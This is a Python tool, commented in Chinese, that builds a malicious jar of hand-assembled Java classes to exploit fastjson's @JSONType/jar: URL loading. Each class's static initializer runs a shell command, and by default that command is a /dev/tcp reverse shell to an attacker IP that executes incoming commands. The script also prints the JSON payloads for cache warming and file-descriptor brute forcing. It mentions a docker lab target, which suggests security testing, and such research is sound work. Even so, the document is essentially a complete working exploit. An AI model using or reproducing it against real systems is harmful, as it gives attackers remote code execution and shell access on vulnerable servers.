#!/usr/bin/env python3
"""纯 Python 版 fastjson @JSONType jar 生成器（不依赖 Java / ASM）

原理:
    直接拼 .class 字节码，每个类的 <clinit> 里调用
        Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", <命令>})
    类内部名写成 jar URL（jar:file:/proc/self/fd/N!/PREFIXN），
    这样 defineClass 时类名校验才能通过。

用法:
    # 反弹 shell（默认命令）
    python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444

    # 自定义命令
    python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 ^
        --cmd "id > /dev/tcp/172.26.50.158/4444"

    # 从文件读命令（避免命令行转义问题，推荐）
    python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 ^
        --cmd-file shell_cmd.txt

    # 生成后自检
    python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 --verify
"""
import argparse
import os
import struct
import sys
import zipfile

# ---------- 常量池辅助 ----------

def u1(v):
    return struct.pack('>B', v)


def u2(v):
    return struct.pack('>H', v)


def u4(v):
    return struct.pack('>I', v)


def cp_utf8(s):
    b = s.encode('utf-8')
    if len(b) > 65535:
        raise ValueError('常量过长: %d 字节' % len(b))
    return b'\x01' + u2(len(b)) + b


def cp_class(idx):
    return b'\x07' + u2(idx)


def cp_nameandtype(n, d):
    return b'\x0c' + u2(n) + u2(d)


def cp_methodref(c, nt):
    return b'\x0a' + u2(c) + u2(nt)


# ---------- 生成单个 .class ----------

def build_class(class_name, command, shell='/bin/bash'):
    """生成一个带 @JSONType 注解、<clinit> 执行命令的 class 字节码

    class_name 是「内部名」，会原样写进 this_class，
    例如 jar:file:/proc/self/fd/42!/XZ42

    注意两个容易写错的点：
      1) ldc 的常量池项必须是 CONSTANT_String(tag 8)，不能直接用 Utf8，
         否则 JVM 抛 ClassFormatError
      2) static 块栈峰值是 5（R, arr, arr, idx, str），max_stack 写 4 会 VerifyError
    """
    pool = []

    def add(entry):
        pool.append(entry)
        return len(pool)          # 常量池下标从 1 开始

    def utf8(s):
        b = s.encode('utf-8')
        if len(b) > 65535:
            raise ValueError('常量过长: %d 字节' % len(b))
        return add(b'\x01' + u2(len(b)) + b)

    def string(s):
        u = utf8(s)
        return add(b'\x08' + u2(u))          # CONSTANT_String

    def cls(name):
        u = utf8(name)
        return add(b'\x07' + u2(u))          # CONSTANT_Class

    def nat(n, d):
        return add(b'\x0c' + u2(n) + u2(d))  # CONSTANT_NameAndType

    def mref(c, nt):
        return add(b'\x0a' + u2(c) + u2(nt))  # CONSTANT_Methodref

    # --- 常量池 ---
    i_this_cls = cls(class_name)
    i_obj_cls = cls('java/lang/Object')
    i_void = utf8('()V')
    i_init = utf8('<init>')
    i_init_nt = nat(i_init, i_void)
    i_obj_init = mref(i_obj_cls, i_init_nt)
    i_code = utf8('Code')
    i_clinit = utf8('<clinit>')
    i_rt_cls = cls('java/lang/Runtime')
    i_getrt = utf8('getRuntime')
    i_getrt_desc = utf8('()Ljava/lang/Runtime;')
    i_getrt_nt = nat(i_getrt, i_getrt_desc)
    i_getrt_ref = mref(i_rt_cls, i_getrt_nt)
    i_str_cls = cls('java/lang/String')
    i_exec = utf8('exec')
    i_exec_desc = utf8('([Ljava/lang/String;)Ljava/lang/Process;')
    i_exec_nt = nat(i_exec, i_exec_desc)
    i_exec_ref = mref(i_rt_cls, i_exec_nt)
    i_bash = string(shell)
    i_dashc = string('-c')
    i_cmd = string(command)
    i_ann_attr = utf8('RuntimeVisibleAnnotations')
    i_ann_type = utf8('Lcom/alibaba/fastjson/annotation/JSONType;')

    for idx, label in ((i_bash, 'shell'), (i_dashc, '-c'), (i_cmd, 'command')):
        if idx > 255:
            raise ValueError('%s 的常量下标 %d 超过 255，ldc 装不下' % (label, idx))

    pool_count = len(pool) + 1

    # --- <init>()V ---
    init_code = (
        b'\x2a'                     # aload_0
        + b'\xb7' + u2(i_obj_init)  # invokespecial Object.<init>
        + b'\xb1'                   # return
    )
    init_code_attr = (
        u2(i_code)
        + u4(2 + 2 + 4 + len(init_code) + 2 + 2)
        + u2(1)                     # max_stack
        + u2(1)                     # max_locals
        + u4(len(init_code))
        + init_code
        + u2(0)                     # exception_table_length
        + u2(0)                     # attributes_count
    )
    init_method = (
        u2(0x0001)                  # ACC_PUBLIC
        + u2(i_init)
        + u2(i_void)
        + u2(1)
        + init_code_attr
    )

    # --- static {} ---
    # 栈峰值: getRuntime(1) → iconst_3(2) → anewarray(1) → dup(2)
    #         → iconst_n(3) → ldc(4) → aastore(2) ...
    clinit_code = (
        b'\xb8' + u2(i_getrt_ref)       # invokestatic Runtime.getRuntime
        + b'\x06'                       # iconst_3
        + b'\xbd' + u2(i_str_cls)       # anewarray String
        + b'\x59'                       # dup
        + b'\x03'                       # iconst_0
        + b'\x12' + u1(i_bash)          # ldc "/bin/bash"
        + b'\x53'                       # aastore
        + b'\x59'                       # dup
        + b'\x04'                       # iconst_1
        + b'\x12' + u1(i_dashc)         # ldc "-c"
        + b'\x53'                       # aastore
        + b'\x59'                       # dup
        + b'\x05'                       # iconst_2
        + b'\x12' + u1(i_cmd)           # ldc <命令>
        + b'\x53'                       # aastore
        + b'\xb6' + u2(i_exec_ref)      # invokevirtual Runtime.exec
        + b'\x57'                       # pop
        + b'\xb1'                       # return
    )
    clinit_code_attr = (
        u2(i_code)
        + u4(2 + 2 + 4 + len(clinit_code) + 2 + 2)
        + u2(5)                     # max_stack（R, arr, arr, idx, str）
        + u2(0)                     # max_locals
        + u4(len(clinit_code))
        + clinit_code
        + u2(0)
        + u2(0)
    )
    clinit_method = (
        u2(0x0008)                  # ACC_STATIC
        + u2(i_clinit)
        + u2(i_void)
        + u2(1)
        + clinit_code_attr
    )

    # --- 类级注解 @JSONType ---
    # RuntimeVisibleAnnotations: num(2) + type_index(2) + num_pairs(2) = 6
    ann_attr = (
        u2(i_ann_attr)
        + u4(6)
        + u2(1)                     # num_annotations
        + u2(i_ann_type)            # type_index
        + u2(0)                     # num_element_value_pairs
    )

    out = (
        b'\xca\xfe\xba\xbe'
        + u2(0)                     # minor
        + u2(52)                    # major = Java 8
        + u2(pool_count)
        + b''.join(pool)
        + u2(0x0021)                # ACC_PUBLIC | ACC_SUPER
        + u2(i_this_cls)
        + u2(i_obj_cls)
        + u2(0)                     # interfaces
        + u2(0)                     # fields
        + u2(2)                     # methods
        + init_method
        + clinit_method
        + u2(1)                     # class attributes
        + ann_attr
    )
    return out


# ---------- 主流程 ----------

DEFAULT_CMD = ('exec 5<>/dev/tcp/__IP__/__PORT__; while read -r c <&5; '
               'do eval "$c" >&5 2>&1; echo __DONE__ >&5; done')

# 带 CR 剥离：c="${c%$'\r'}" —— 去掉 Windows 终端回车带来的 \r
DEFAULT_CMD_CR = ('exec 5<>/dev/tcp/__IP__/__PORT__; while read -r c <&5; '
                  'do c="${c%$' + "'" + '\\r' + "'" + '}"; eval "$c" >&5 2>&1; echo __DONE__ >&5; done')


def build_default_cmd(ip, port, strip_cr):
    tpl = DEFAULT_CMD_CR if strip_cr else DEFAULT_CMD
    return tpl.replace('__IP__', ip).replace('__PORT__', str(port))


def ip_to_int(ip):
    parts = [int(x) for x in ip.split('.')]
    if len(parts) != 4 or any(p < 0 or p > 255 for p in parts):
        raise ValueError('非法 IP: %s' % ip)
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]


def main():
    ap = argparse.ArgumentParser(description='纯 Python fastjson @JSONType jar 生成器')
    ap.add_argument('--prefix', required=True, help='类前缀，如 XZ（类名 XZ0~XZn）')
    ap.add_argument('--jar', required=True, help='输出 jar 文件名（不能带点）')
    ap.add_argument('--ip', required=True, help='攻击机 IP（点分格式）')
    ap.add_argument('--port', type=int, required=True, help='命令里的端口（反弹 shell 用）')
    ap.add_argument('--http-port', type=int, default=18081, help='预热 URL 里的 HTTP 端口，默认 18081')
    ap.add_argument('--max-fd', type=int, default=2047, help='生成 0~n，默认 2047')
    ap.add_argument('--shell', default='/bin/bash', help='解释器路径，默认 /bin/bash')
    ap.add_argument('--cmd', default=None, help='自定义命令（与 --cmd-file 二选一）')
    ap.add_argument('--cmd-file', default=None, help='从文件读命令（推荐，避免转义）')
    ap.add_argument('--cr', action='store_true',
                    help='命令里加 CR 剥离 c="${c%%$\'\\r\'}"，Windows 终端敲命令不会报错')
    ap.add_argument('--out-dir', default=None, help='输出目录，默认 docker-lab/www')
    ap.add_argument('--verify', action='store_true', help='生成后自检（需要 javap）')
    ap.add_argument('--force', action='store_true', help='允许覆盖同名 jar（不推荐，会被靶机 URL 缓存）')
    args = ap.parse_args()

    if '.' in args.jar:
        print('[!] 警告: jar 名带点会被 fastjson 的 replace(\'.\',\'/\') 改坏，建议去掉')
    if '.' in args.prefix:
        print('[!] 警告: 前缀带点会破坏类名，建议去掉')

    # 取命令
    if args.cmd_file:
        with open(args.cmd_file, 'r', encoding='utf-8') as f:
            command = f.read().strip()
        if args.cr and 'c%' not in command:
            print('[!] 提示: 用了 --cmd-file 但文件里没有 CR 剥离，--cr 不生效')
    elif args.cmd:
        command = args.cmd
        if args.cr and 'c%' not in command:
            print('[!] 提示: 用了 --cmd 但命令里没有 CR 剥离，--cr 不生效')
    else:
        command = build_default_cmd(args.ip, args.port, args.cr)

    # 命令安全校验
    problems = []
    if command.startswith('String '):
        problems.append("命令开头多了 'String '（从 javap 输出复制时带进来的）")
    if '^' in command:
        problems.append("命令含 '^'（cmd 转义符残留）")
    if '\r' in command or '\n' in command:
        problems.append('命令含换行符')
    if 'eval $c' in command and 'eval "$c"' not in command:
        problems.append('eval $c 缺双引号，应为 eval "$c"')
    if problems:
        print('[-] 命令有问题，拒绝生成：')
        for p in problems:
            print('    * ' + p)
        sys.exit(1)

    out_dir = args.out_dir or os.path.join(
        os.path.dirname(os.path.abspath(__file__)), '..', 'docker-lab', 'www')
    out_dir = os.path.abspath(out_dir)
    out_path = os.path.join(out_dir, args.jar)
    os.makedirs(out_dir, exist_ok=True)

    # 重名检查：靶机会按 jar URL 缓存，同名文件不会重新下载 → 必须换名字
    if os.path.exists(out_path) and not args.force:
        import time as _t
        old = _t.strftime('%Y-%m-%d %H:%M:%S', _t.localtime(os.path.getmtime(out_path)))
        print('[-] 目标文件已存在，拒绝覆盖：')
        print('    %s  (%s)' % (out_path, old))
        print('')
        print('    原因: 靶机按 jar URL 缓存，同名文件不会重新下载，')
        print('          你会拿到旧内容的缓存，扫 fd 一定打不通。')
        print('')
        print('    解决: 换一个新名字，例如 %s2 / %s_new' % (args.jar, args.jar))
        print('          或加 --force 强制覆盖（不推荐）')
        sys.exit(1)

    ip_int = ip_to_int(args.ip)
    warm_url = 'jar:http://%d:%d/%s!/A0' % (ip_int, args.http_port, args.jar)

    print('[*] 前缀      : %s' % args.prefix)
    print('[*] jar       : %s' % out_path)
    print('[*] 类数量    : %d' % (args.max_fd + 1))
    print('[*] 解释器    : %s' % args.shell)
    print('[*] CR 剥离   : %s' % ('开（c="${c%$\'\\r\'}"）' if 'c%' in command else '关'))
    print('[*] 命令      : %s' % command)
    print('[*] 预热URL   : %s' % warm_url)

    if os.path.exists(out_path):
        print()
        print('[!] 注意: %s 已存在，同名 jar 会被靶机按 URL 缓存，' % args.jar)
        print('    导致靶机继续用旧内容 → 打不通。建议换个新 jar 名，例如 %s%d'
              % (args.jar, int(__import__('time').time()) % 10000))

    with zipfile.ZipFile(out_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for i in range(args.max_fd + 1):
            name = '%s%d' % (args.prefix, i)
            internal = 'jar:file:/proc/self/fd/%d!/%s' % (i, name)
            z.writestr(name + '.class', build_class(internal, command, args.shell))
        # 预热类
        z.writestr('A0.class', build_class(warm_url, command, args.shell))

    size = os.path.getsize(out_path)
    print('[+] 已生成: %s (%d 字节, %d 个类)' % (out_path, size, args.max_fd + 2))
    print()
    print('预热 payload:')
    print('  {"@type":"jar:http:..%d:%d.%s!.A0"}' % (ip_int, args.http_port, args.jar))
    print('打 fd payload:')
    print('  {"@type":"jar:file:.proc.self.fd.N!.%sN","x":1}' % args.prefix)

    if args.verify:
        verify(out_path, args.prefix)


def verify(jar_path, prefix):
    """用 javap 反汇编第一个类，检查关键项"""
    import subprocess
    import tempfile
    import shutil

    javap = None
    for cand in (r'D:\Java\jdk-11.0.11\bin\javap', 'javap'):
        try:
            subprocess.run([cand, '-version'], capture_output=True, timeout=10)
            javap = cand
            break
        except Exception:
            continue
    if not javap:
        print('[!] 找不到 javap，跳过自检')
        return

    jar_exe = None
    for cand in (r'D:\Java\jdk-11.0.11\bin\jar', 'jar'):
        try:
            subprocess.run([cand, '--version'], capture_output=True, timeout=10)
            jar_exe = cand
            break
        except Exception:
            continue
    if not jar_exe:
        print('[!] 找不到 jar 命令，跳过自检')
        return

    tmp = tempfile.mkdtemp()
    try:
        entry = '%s0.class' % prefix
        subprocess.run([jar_exe, 'xf', jar_path, entry, 'A0.class'], cwd=tmp, check=True)
        for cls in (entry, 'A0.class'):
            r = subprocess.run([javap, '-c', '-p', cls], cwd=tmp, capture_output=True, text=True)
            lines = r.stdout.splitlines()
            name = next((l for l in lines if l.startswith('public class')), '?')
            cmd = next((l.strip() for l in lines if '// String exec' in l or '// String bash' in l), '?')
            print('\n[verify] %s' % cls)
            print('  内部名: %s' % name.strip())
            print('  命令  : %s' % cmd)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == '__main__':
    main()
